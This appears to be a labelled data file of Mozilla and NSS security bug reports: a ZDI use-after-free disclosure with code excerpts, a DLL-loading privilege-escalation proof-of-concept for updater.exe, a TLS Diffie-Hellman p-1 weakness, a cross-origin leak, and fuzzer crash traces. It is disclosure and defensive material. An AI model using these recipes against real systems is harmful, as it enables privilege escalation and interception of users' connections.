only if all of its inputs are origin-clean it follows that a filter primitive with no inputs is origin-clean an feimage is origin-clean if drawing img element with the same source to an origin-clean canvas would leave the canvas origin-clean if the fedisplacementmap s displacements input is not origin-clean it should produce transparent black	5
imgrequestproxy use-after-free remote code execution vulnerability zdi-can-2036 date thu 21 nov 2013 14:21:29 0600 from zdi disclosures zdi-disclosures tippingpoint.com to security mozilla.org subject zdi-can-2036 new vulnerability report zdi-can-2036 mozilla firefox imgrequestproxy use-after-free remote code execution vulnerability cvss 6.8 av n/ac m/au n/c p/i p/a p abstract hp s zero day initiative has identified a vulnerability affecting the following products mozilla firefox vulnerability details flaw exists in image processing when source is set by server with content-type multipart/x-mixed-replace when new image is getting loaded new imgrequestproxy object gets allocated by imgloader createnewproxyforrequest c mozilla-build\mozilla-central\image\src\imgloader.cpp:644 nsresult imgloader createnewproxyforrequest imgrequest arequest nsiloadgroup aloadgroup imginotificationobserver aobserver nsloadflags aloadflags imgrequestproxy retval log_scope_with_param getimglog imgloader createnewproxyforrequest imgrequest arequest xxx if we move decoding onto separate threads we should save off the calling thread here and pass it off to proxyrequest so that it call proxy calls to aobserver imgrequestproxy proxyrequest new imgrequestproxy ns_addref proxyrequest related call stack childebp retaddr 001def64 5a89a3ae xul imgloader createnewproxyforrequest c mozilla-build\mozilla-central\image\src\imgloader.cpp 644 001df188 5ab3dda8 xul imgloader loadimage c mozilla-build\mozilla-central\image\src\imgloader.cpp 1771 001df1f0 5ab6d966 xul nscontentutils loadimage c mozilla-build\mozilla-central\content\base\src\nscontentutils.cpp 2768 001df22c 5afea673 xul nsdocument maybepreloadimage c mozilla-build\mozilla-central\content\base\src\nsdocument.cpp 8518 001df244 5afd5689 xul nshtml5treeopexecutor preloadimage c mozilla-build\mozilla-central\parser\html\nshtml5treeopexecutor.cpp 1076 001df2b4 5afeb6e2 xul nshtml5speculativeload perform c mozilla-build\mozilla-central\parser\html\nshtml5speculativeload.cpp 32 001df2ec 5afd6efc xul nshtml5treeopexecutor runflushloop c mozilla-build\mozilla-central\parser\html\nshtml5treeopexecutor.cpp 508 001df2f8 5b9b69a3 xul nshtml5executorflusher run c mozilla-build\mozilla-central\parser\html\nshtml5streamparser.cpp 133 001df35c 5b96f8cc xul nsthread processnextevent c mozilla-build\mozilla-central\xpcom\threads\nsthread.cpp 622 001df370 5b4eb8d5 xul ns_processnextevent c mozilla-build\mozilla-central\xpcom\glue\nsthreadutils.cpp 238 001df39c 5b9f3baa xul mozilla ipc messagepump run c mozilla-build\mozilla-central\ipc\glue\messagepump.cpp 85 001df3bc 5b9f40e7 xul messageloop runinternal c mozilla-build\mozilla-central\ipc\chromium\src\base\message_loop.cc 220 001df3f0 5b9f45b2 xul messageloop runhandler c mozilla-build\mozilla-central\ipc\chromium\src\base\message_loop.cc 214 001df410 5b44bdc1 xul messageloop run c mozilla-build\mozilla-central\ipc\chromium\src\base\message_loop.cc 188 001df420 5b410231 xul nsbaseappshell run c mozilla-build\mozilla-central\widget\xpwidgets\nsbaseappshell.cpp 163 001df430 5b255735 xul nsappshell run c mozilla-build\mozilla-central\widget\windows\nsappshell.cpp 113 in frame nr.4 one can see nsdocument maybepreloadimage call c mozilla-build\mozilla-central\content\base\src\nsdocument.cpp:8477 void nsdocument maybepreloadimage nsiuri uri const nsastring amp acrossoriginattr early exit if the img is already present in the img-cache which indicates that the real load has already started and that we should n't preload it int16_t blockingstatus if nscontentutils isimageincache uri static_cast nsidocument this nscontentutils canloadimage uri static_cast nsidocument this this nodeprincipal amp blockingstatus return nsloadflags loadflags nsirequest load_normal switch element stringtocorsmode acrossoriginattr case cors_none nothing to do break case cors_anonymous loadflags imgiloader load_cors_anonymous break case cors_use_credentials loadflags imgiloader load_cors_use_credentials break default moz_crash unknown cors mode image not in cache trigger preload nsrefptr imgrequestproxy request nsresult rv nscontentutils loadimage uri this nodeprincipal mdocumenturi uri of document used as referrer nullptr no observer loadflags getter_addrefs request pin image-reference to avoid evicting it from the img-cache before the real load occurs unpinned in dispatchcontentloadedevents and unlink if ns_succeeded rv mpreloadingimages.appendobject request this will save reference to imgrequestproxy object in mpreloadingimages after image has loaded nsdocument dispatchcontentloadedevents will be called c mozilla-build\mozilla-central\content\base\src\nsdocument.cpp:4611 void nsdocument dispatchcontentloadedevents if you add early returns from this method make sure you re calling unblockonload properly unpin references to preloaded images mpreloadingimages.clear this will call imgrequestproxy release and imgrequestproxy object will be freed c mozilla-build\mozilla-central\image\src\imgrequestproxy.cpp:94 ns_impl_release imgrequestproxy related call stack childebp retaddr 001df25c 5a89e77e xul imgrequestproxy scalar deleting destructor 001df274 5a69795d xul imgrequestproxy release c mozilla-build\mozilla-central\image\src\imgrequestproxy.cpp 94 001df280 5a8929ab xul nscomptr nsirequest nscomptr nsirequest c mozilla-build\mozilla-central\obj-i686-pc-mingw32\dist\include\nscomptr.h 514 001df288 5a893774 xul nsprogressnotificationproxy nsprogressnotificationproxy c mozilla-build\mozilla-central\image\src\imgloader.h 433 001df29c 5b968f23 xul nsprogressnotificationproxy release c mozilla-build\mozilla-central\image\src\imgloader.cpp 230 001df2b0 5b9c6b00 xul ns_proxyrelease c mozilla-build\mozilla-central\xpcom\glue\nsproxyrelease.cpp 48 001df2d8 5b9c6c49 xul nsinterfacerequestoragg nsinterfacerequestoragg c mozilla-build\mozilla-central\xpcom\base\nsinterfacerequestoragg.cpp 55 001df2ec 5b968eb2 xul nsinterfacerequestoragg release c mozilla-build\mozilla-central\xpcom\base\nsinterfacerequestoragg.cpp 37 001df2f8 5b9b69a3 xul nsproxyreleaseevent run c mozilla-build\mozilla-central\xpcom\glue\nsproxyrelease.cpp 20 001df35c 5b96f8cc xul nsthread processnextevent c mozilla-build\mozilla-central\xpcom\threads\nsthread.cpp 622 001df370 5b4eb8d5 xul ns_processnextevent c mozilla-build\mozilla-central\xpcom\glue\nsthreadutils.cpp 238 001df39c 5b9f3baa xul mozilla ipc messagepump run c mozilla-build\mozilla-central\ipc\glue\messagepump.cpp 85 001df3bc 5b9f40e7 xul messageloop runinternal c mozilla-build\mozilla-central\ipc\chromium\src\base\message_loop.cc 220 001df3f0 5b9f45b2 xul messageloop runhandler c mozilla-build\mozilla-central\ipc\chromium\src\base\message_loop.cc 214 001df410 5b44bdc1 xul messageloop run c mozilla-build\mozilla-central\ipc\chromium\src\base\message_loop.cc 188 001df420 5b410231 xul nsbaseappshell run c mozilla-build\mozilla-central\widget\xpwidgets\nsbaseappshell.cpp 163 though after imgrequestproxy is freed another imgstatustracker syncnotifystate call will use already freed imgrequestproxy object triggering the bug is a bit hard as it requires refreshing a lot of times credit this vulnerability was discovered by arthur gerkis further details if supporting files were contained with this report they are provided within a password protected zip file the password is the zdi candidate number in the form zdi-can-xxxx where xxxx is the id number please confirm receipt of this report we expect all vendors to remediate zdi vulnerabilities within 180 days of the reported date if you are ready to release a patch at any point leading up the the deadline please coordinate with us so that we may release our advisory detailing the issue if the 180 day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations so that the public can protect themselves in the absence of a patch please keep us updated regarding the status of this issue and feel free to contact us at any time zero day initiative zdi-disclosures tippingpoint.com the pgp key used for all zdi vendor communications is available from information about the zdi established by tippingpoint and acquired by hewlett-packard the zero day initiative zdi represents a best-of-breed model for rewarding security researchers for responsibly disclosing discovered vulnerabilities the zdi is unique in how the acquired vulnerability information is used the zdi does not re-sell the vulnerability details or any exploit code instead upon notifying the affected product vendor the zdi provides its hp tippingpoint customers with zero day protection through its intrusion prevention technology explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available please contact us for further information or refer to disclosure policy our vulnerability disclosure policy is available online at gpgkeys key 556d80c193a35b1c not found on keyserver zdi-can-2036.zip.pgp	11
image decoding causing firefox to crash with goo create user agent mozilla/5.0 windows nt 6.1 wow64 applewebkit/537.36 khtml like gecko chrome/31.0.1650.57 safari/537.36 steps to reproduce this is a bug discovered in goo create the issue reported on our bugtracking system is located here crash reports reported related to this bp-dd9e5c6b-c6f7-46d8-afca-0847d2131121 2013-11-21 13:17 bp-b4364feb-e53b-4a1d-9444-cb0e22131121 2013-11-21 13:10 bp-3510a383-ad61-4290-821c-97ff32131121 2013-11-21 13:06 bp-98816ed0-8987-4915-92cf-257222131121 2013-11-21 13:01 bp-24d61e5d-e863-4fe4-b844-21f2d2131121 2013-11-21 13:00 bp-36f83bc5-a4ea-4e82-b392-00f5f2131121 2013-11-21 12:58 bp-2a8e1482-726a-458c-b538-6a5ed2131121 2013-11-21 12:56 bp-b1d3fe71-ef60-4942-898a-03ff02131121 2013-11-21 12:55 bp-fc8435e9-34f9-4ee2-b0ab-42f562131121 2013-11-21 12:47 bp-99e4ad95-8375-41c5-aca3-642d02131121 2013-11-21 11:20 bp-cb9351ba-c090-4d26-9e8b-55c0b2131121 2013-11-21 11:16 computer specs win 7 home premium 64bit sp1 intel i5-3450 8gb ram nvidia geforce gtx 660 1 go to goo create create.gootechnologies.com login with an account you have been provided with the accounts can be used simultaneously but do create new projects to avoid possible conflicts 2 create a new project by clicking on the create new project button on the bottom right of the manage projects dialog which is popped up upon logging in 3 click on the red asset library button in the bottom right and click on the zombie or goon to add either of them to the scene a model with textures is needed 4 using the menu bar on the left side of the screen find and click the material button to open up the material panel shiny sphere icon in the middle 5 on the right top menu under the project header find and click the display textures button to be able to view the textures in the current project checkered square icon 6 click on the now visible textures may have to click between them swiftly in some cases it instantly craches in some cases after a few clicks actual results firefox crashes shuts down instantly followed by a dialog for submitting a crash report expected results i should still be in goo create with the material panel showing settings and a preview image of the selected texture	2
the updater.exe loads the bcrypt.dll and other dll s from the working and binary directory when not using the service application update the updater.exe loads the bcrypt.dll from the update directory for example while performing an update that can lead to a privilege escalation while updating without the mozilla maintenance service i have tested this on win7 pro 32bit with firefox 25.0.1 quick poc 1 1 copy the updater.exe from firefox 25.0.1 and create a bcrypt.dll file with no content in the same location 2 start the updater.exe 3 a error message will occur because the update tries to load the empty dll also other dlls are loaded from the working directory but only the bcrypt.dll is loaded while performing an update without the service from the high integrity updater process	2
cross-origin information disclosure with error message of web workers user agent mozilla/5.0 windows nt 6.3 wow64 rv:25.0 gecko/20100101 firefox/25.0 beta/release build id 20131112160018 steps to reproduce 1 go to and click the button 2 if you are twitter user you can see the following message failed to load script if not failed to load script in error message this means that firefox leaks redirect information to unrelated site actual results firefox includes redirect information in error message expected results firefox should not include redirect information in error message	6
do not allow p-1 as a public dh value user agent mozilla/5.0 windows nt 6.1 wow64 rv:25.0 gecko/20100101 firefox/25.0 beta/release build id 20131025151332 steps to reproduce 1 create a tls server supporting only the dhe key exchange 2 during any handshake send the parameters p g g^q where p=2q+1 is a prime such that q is also prime and g is not a quadratic residue mod p 3 nss accepts this value and proceeds with the handshake the pms computed by nss is g q kc actual results nss accepts to proceed with the exchange if g is not a quadratic residue mod p then g^q p-1 which is not rejected by nss as it accepts any public value in 2 p-1 this is allowed by rfc2631 then the computed pms g q kc is 1 if kc is even because g 2q g p-1 1 mod p and p-1 if kc is odd because g^q=p-1 mod p if the server chose a ks with the same parity the pms will be the same on the client and server but the communication is not safe because an attacker can derive it from the parameters sent over the network expected results in itself the impact of accepting 2p+1 g g^p is not too high because these parameters are signed by the server certificate s public key and very few server will chose them however our worry is the ability for a malicious website to send such parameters both to the client and to a victim server acting as man in the middle this can allow a tls session to the malicious server to be resumed on the victim server which breaks channel bindings channel id and can be combined with renegotiation in chromium to break client authentication among other things this is discussed in chrome bugs 305951 306959 305220 and is the main reason why this report should stay private for a short while	4
heap-use-after-free in libnss3.so cert_destroycertificate found by the blackberry security automated analysis team s fuzzing framework alf at this time we are unable to create a test case that will reproduce the issue however we do see it during our analysis a couple times a day so once a build with a fix is available we should be able to verify that this issue has been resolved 5650==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t3 socket thread 0 libnss3.so cert_destroycertificate line 791 of stanpcertdb.c 1 libssl3.so ssl3_destroyssl3info line 9635 of ssl3con.c 2 libssl3.so ssl_destroysocketcontents line 335 of sslsock.c 3 libssl3.so ssl_freesocket line 398 of sslsock.c 4 libssl3.so ssl_defclose line 205 of ssldef.c 5 libxul.so nsnsssocketinfo closesocketanddestroy nsnssshutdownpreventionlock const line 843 of builds/slave/m-in-l64-asan-0000000000000000/build/security/manager/ssl/src/nsnssiolayer.cpp 6 libxul.so nsssliolayerclose prfiledesc line 821 of builds/slave/m-in-l64-asan-0000000000000000/build/security/manager/ssl/src/nsnssiolayer.cpp 7 libxul.so nssockettransport releasefd_locked prfiledesc line 1604 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nssockettransport2.cpp 8 libxul.so nssockettransport onsocketdetached prfiledesc line 1867 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nssockettransport2.cpp 9 libxul.so nssockettransportservice detachsocket nssockettransportservice socketcontext nssockettransportservice socketcontext line 181 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nssockettransportservice2.cpp 10 libxul.so nssockettransportservice dopolliteration bool line 862 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nssockettransportservice2.cpp 11 libxul.so nssockettransportservice run line 684 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nssockettransportservice2.cpp 12 libxul.so non-virtual thunk to nssockettransportservice run line 728 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nssockettransportservice2.cpp 13 libxul.so nsthread processnextevent bool bool line 637 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsthread.cpp 14 libxul.so ns_processnextevent nsithread bool line 263 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsthreadutils.cpp 15 libxul.so mozilla ipc messagepumpfornonmainthreads run base messagepump delegate line 301 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/messagepump.cpp 16 libxul.so messageloop run line 226 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc 17 libxul.so nsthread threadfunc void line 258 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsthread.cpp 18 libnspr4.so pt_root line 205 of builds/slave/m-in-l64-asan-0000000000000000/build/nsprpub/pr/src/pthreads/ptthread.c 19 firefox asan asanthread threadstart unsigned long line 138 of builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_thread.cc 20 libpthread.so.0 start_thread line 308 of pthread_create.c 21 libc.so.6 clone line 112 of sysdeps/unix/sysv/linux/x86_64/clone.s is located 696 bytes inside of 2048-byte region freed by thread t0 here 0 firefox free line 64 of builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc 1 libplds4.so pl_finisharenapool line 277 of builds/slave/m-in-l64-asan-0000000000000000/build/nsprpub/lib/ds/plarena.c 2 libxul.so presshell paint nsview nsregion const unsigned int line 5847 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nspresshell.cpp 3 libxul.so nsviewmanager processpendingupdatesforview nsview bool line 420 of builds/slave/m-in-l64-asan-0000000000000000/build/view/src/nsviewmanager.cpp 4 libxul.so nsrefreshdriver tick long mozilla timestamp line 1207 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsrefreshdriver.cpp 5 libxul.so mozilla refreshdrivertimer tick line 168 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsrefreshdriver.cpp 6 libxul.so nstimerimpl fire line 551 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nstimerimpl.cpp 7 libxul.so nstimerevent run line 635 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nstimerimpl.cpp 8 libxul.so ns_processnextevent nsithread bool line 263 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsthreadutils.cpp 9 libxul.so mozilla ipc messagepump run base messagepump delegate line 134 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/messagepump.cpp 10 libxul.so messageloop run line 226 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc 11 libxul.so nsbaseappshell run line 161 of builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsbaseappshell.cpp 12 libxul.so xremain xre_main int char nsxreappdata const line 4091 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 13 libxul.so xre_main line 4331 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 14 firefox main line 280 of builds/slave/m-in-l64-asan-0000000000000000/build/browser/app/nsbrowserapp.cpp 15 libc.so.6 libc_start_main line 226 of libc-start.c previously allocated by thread t3 socket thread here 0 firefox malloc line 74 of builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc 1 libplds4.so pl_arenaallocate line 203 of builds/slave/m-in-l64-asan-0000000000000000/build/nsprpub/lib/ds/plarena.c thread t3 socket thread created by t0 here 0 firefox pthread_create line 155 of builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc 1 libnspr4.so pr_createthread line 445 of builds/slave/m-in-l64-asan-0000000000000000/build/nsprpub/pr/src/pthreads/ptthread.c 2 libnspr4.so pr_createthread line 528 of builds/slave/m-in-l64-asan-0000000000000000/build/nsprpub/pr/src/pthreads/ptthread.c shadow bytes around the buggy address fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 5650==aborting	5
out of bounds read in libxul.so gfxcontext polygon found by the blackberry security automated analysis team s fuzzing framework alf 7859==error addresssanitizer stack-buffer-overflow on address at pc bp sp read of size 8 at thread t0 0 libxul.so gfxcontext polygon gfxpoint const unsigned int line 66 of builds/slave/m-in-l64-asan-0000000000000000/build/gfx/thebes/gfx2dglue.h 1 libxul.so nsdisplaynotation paint nsdisplaylistbuilder nsrenderingcontext line 803 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/mathml/nsmathmlmencloseframe.cpp 2 libxul.so mozilla framelayerbuilder paintitems nstarray mozilla framelayerbuilder clippeddisplayitem nsintrect const gfxcontext nsrenderingcontext nsdisplaylistbuilder nsprescontext nsintpoint const float float int line 3487 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/framelayerbuilder.cpp 3 libxul.so mozilla framelayerbuilder drawthebeslayer mozilla layers thebeslayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void line 3649 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/framelayerbuilder.cpp 4 libxul.so mozilla layers basicthebeslayer paintbuffer gfxcontext nsintregion const nsintregion const nsintregion const bool mozilla layers drawregionclip void mozilla layers thebeslayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void line 114 of builds/slave/m-in-l64-asan-0000000000000000/build/gfx/layers/basic/basicthebeslayer.h 5 libxul.so mozilla layers basicthebeslayer validate void mozilla layers thebeslayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void line 208 of builds/slave/m-in-l64-asan-0000000000000000/build/gfx/layers/basic/basicthebeslayer.cpp 6 libxul.so non-virtual thunk to mozilla layers basiccontainerlayer validate void mozilla layers thebeslayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void line 124 of builds/slave/m-in-l64-asan-0000000000000000/build/gfx/layers/basic/basiccontainerlayer.cpp 7 libxul.so non-virtual thunk to mozilla layers basiccontainerlayer validate void mozilla layers thebeslayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void line 124 of builds/slave/m-in-l64-asan-0000000000000000/build/gfx/layers/basic/basiccontainerlayer.cpp 8 libxul.so mozilla layers basiclayermanager endtransactioninternal void mozilla layers thebeslayer gfxcontext nsintregion const mozilla layers drawregionclip nsintregion const void void mozilla layers layermanager endtransactionflags line 597 of builds/slave/m-in-l64-asan-0000000000000000/build/gfx/layers/basic/basiclayermanager.cpp 9 libxul.so nsdisplaylist paintforframe nsdisplaylistbuilder nsrenderingcontext nsiframe unsigned int const line 1231 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsdisplaylist.cpp 10 libxul.so nsdisplaylist paintroot nsdisplaylistbuilder nsrenderingcontext unsigned int const line 1076 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsdisplaylist.cpp 11 libxul.so nslayoututils paintframe nsrenderingcontext nsiframe nsregion const unsigned int unsigned int line 2339 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nslayoututils.cpp 12 libxul.so presshell paint nsview nsregion const unsigned int line 5847 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nspresshell.cpp 13 libxul.so nsviewmanager processpendingupdatesforview nsview bool line 420 of builds/slave/m-in-l64-asan-0000000000000000/build/view/src/nsviewmanager.cpp 14 libxul.so nsrefreshdriver tick long mozilla timestamp line 1207 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsrefreshdriver.cpp 15 libxul.so mozilla refreshdrivertimer tick line 168 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsrefreshdriver.cpp 16 libxul.so nstimerimpl fire line 551 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nstimerimpl.cpp 17 libxul.so nstimerevent run line 635 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nstimerimpl.cpp 18 libxul.so nsthread processnextevent bool bool line 637 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsthread.cpp 19 libxul.so ns_processnextevent nsithread bool line 263 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsthreadutils.cpp 20 libxul.so mozilla ipc messagepump run base messagepump delegate line 95 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/messagepump.cpp 21 libxul.so messageloop run line 226 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc 22 libxul.so nsbaseappshell run line 161 of builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsbaseappshell.cpp 23 libxul.so nsappstartup run line 276 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/components/startup/nsappstartup.cpp 24 libxul.so xremain xre_mainrun line 4023 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 25 libxul.so xremain xre_main int char nsxreappdata const line 4091 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 26 libxul.so xre_main line 4331 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 27 firefox main line 280 of builds/slave/m-in-l64-asan-0000000000000000/build/browser/app/nsbrowserapp.cpp 28 libc.so.6 libc_start_main line 226 of libc-start.c 29 firefox start address is located in stack of thread t0 at offset 784 in frame 0 libxul.so nsdisplaynotation paint nsdisplaylistbuilder nsrenderingcontext line 739 of builds/slave/m-in-l64-asan-0000000000000000/build/layout/mathml/nsmathmlmencloseframe.cpp this frame has 11 object s 32 64 rect 96 112 160 176 224 288 320 336 384 400 448 464 512 528 576 592 640 656 704 784 p hint this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext longjmp and c exceptions are supported shadow bytes around the buggy address f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00 00 00 00 00 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 f4 f4 f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 00 00 f4 f4 f2 f2 f2 f2 00 00 00 00 f2 f2 f2 f2 00 00 00 00 f3 f3 f3 f3 00 00 00 00 00 00 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe 7859==aborting	11
heap-use-after-free in libxul.so nshostresolver conditionallyrefreshrecord found by the blackberry security automated analysis team s fuzzing framework alf at this time we do not have a test case that will reproduce the issue 14607==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 libxul.so nshostresolver conditionallyrefreshrecord nshostrecord char const line 368 of dist/include/nstarray.h 1 libxul.so nshostresolver resolvehost char const unsigned short unsigned short nsresolvehostcallback line 634 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/dns/nshostresolver.cpp 2 libxul.so nsdnsservice asyncresolve nsacstring_internal const unsigned int nsidnslistener nsieventtarget nsicancelable line 675 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/dns/nsdnsservice2.cpp 3 libxul.so nsdnsprefetch prefetch unsigned short line 64 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nsdnsprefetch.cpp 4 libxul.so mozilla net nshttpchannel beginconnect line 4540 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/protocol/http/nshttpchannel.cpp 5 libxul.so mozilla net nshttpchannel onproxyavailable nsicancelable nsiuri nsiproxyinfo tag_nsresult line 4650 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/protocol/http/nshttpchannel.cpp 6 libxul.so nsasyncresolverequest docallback line 238 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nsprotocolproxyservice.cpp 7 libxul.so nsprotocolproxyservice asyncresolveinternal nsiuri unsigned int nsiprotocolproxycallback nsicancelable bool line 130 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/base/src/nsprotocolproxyservice.cpp 8 libxul.so mozilla net nshttpchannel resolveproxy line 1776 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/protocol/http/nshttpchannel.cpp 9 libxul.so mozilla net nshttpchannel asyncopen nsistreamlistener nsisupports line 4444 of builds/slave/m-in-l64-asan-0000000000000000/build/netwerk/protocol/http/nshttpchannel.cpp 10 libxul.so mozilla dom htmltrackelement loadresource line 247 of builds/slave/m-in-l64-asan-0000000000000000/build/content/html/content/src/htmltrackelement.cpp 11 libxul.so nsrunnablemethodimpl void mozilla dom htmltrackelement void true run line 383 of dist/include/nsthreadutils.h 12 libxul.so mozilla dom nssyncsection run line 693 of builds/slave/m-in-l64-asan-0000000000000000/build/content/html/content/src/htmlmediaelement.cpp 13 libxul.so nsbaseappshell runsyncsectionsinternal bool unsigned int line 349 of builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsbaseappshell.cpp 14 libxul.so non-virtual thunk to nsbaseappshell afterprocessnextevent nsithreadinternal unsigned int bool line 90 of builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsbaseappshell.h 15 libxul.so nsthread processnextevent bool bool line 648 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsthread.cpp 16 libxul.so ns_processnextevent nsithread bool line 263 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsthreadutils.cpp 17 libxul.so mozilla ipc messagepump run base messagepump delegate line 95 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/messagepump.cpp 18 libxul.so messageloop run line 226 of builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc 19 libxul.so nsbaseappshell run line 161 of builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsbaseappshell.cpp 20 libxul.so nsappstartup run line 268 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/components/startup/nsappstartup.cpp 21 libxul.so xremain xre_mainrun line 4023 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 22 libxul.so xremain xre_main int char nsxreappdata const line 4091 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 23 libxul.so xre_main line 4331 of builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsapprunner.cpp 24 firefox main line 280 of builds/slave/m-in-l64-asan-0000000000000000/build/browser/app/nsbrowserapp.cpp 25 libc.so.6 libc_start_main line 226 of libc-start.c 26 firefox start is located 0 bytes inside of 24-byte region freed by thread t3 socket thread here 0 firefox free line 64 of builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc 1 libxul.so nstarray_base nstarrayinfallibleallocator nstarray_copywithmemutils shrinkcapacity unsigned int unsigned long line 212 of builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/build glue/nstarray.h previously allocated by thread t3 socket thread here 0 firefox malloc line 74 of 